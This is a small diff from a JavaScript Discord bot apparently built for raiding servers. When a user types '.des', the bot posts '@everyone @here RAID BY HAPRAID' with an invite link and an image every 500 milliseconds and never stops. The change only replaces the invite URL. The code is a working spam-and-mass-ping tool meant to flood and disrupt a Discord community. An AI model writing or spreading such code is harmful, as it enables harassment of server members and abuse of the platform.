@@ -27,7 +27,7 @@ bot.on('message', msg => {
   if (msg.content === '.des') {
     console.log(`Commande .des par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.me/hapraid https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
+      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
      }, 500);
   }
  
